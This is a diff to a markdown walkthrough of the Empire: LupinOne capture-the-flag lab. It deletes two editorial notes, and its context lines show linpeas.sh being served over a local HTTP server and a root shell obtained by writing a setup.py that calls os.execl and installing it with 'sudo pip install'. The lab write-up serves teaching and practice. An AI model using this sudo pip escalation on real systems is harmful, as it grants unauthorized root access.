@@ -234,8 +234,6 @@ $ python3 -m http.server 8080
   <img src="https://raw.githubusercontent.com/itstallam/Empire-LupinOne/main/Screenshots/s11.png" alt="local HTTP server serving linpeas.sh" width="600"/>
 </p>
 
-> **Note:** the source document referenced this screenshot as `s11.pngr` — corrected to `.png` here, since `.pngr` isn't a valid extension. Double-check the actual filename in your `Screenshots` folder before publishing.
-
 On the `icex64` terminal:
 
 ```bash
@@ -295,8 +293,6 @@ arsene@LupinOne:/$ TF=$(mktemp -d)
 arsene@LupinOne:/$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
 arsene@LupinOne:/$ sudo pip install $TF
 ```
-
-> **Note:** the source document had `os.excl(...)` — corrected to `os.execl(...)` here, since `os.excl` isn't a real Python method. Worth double-checking against your own terminal history before publishing.
 
 ### 🏁 Root Access Achieved
 ```bash
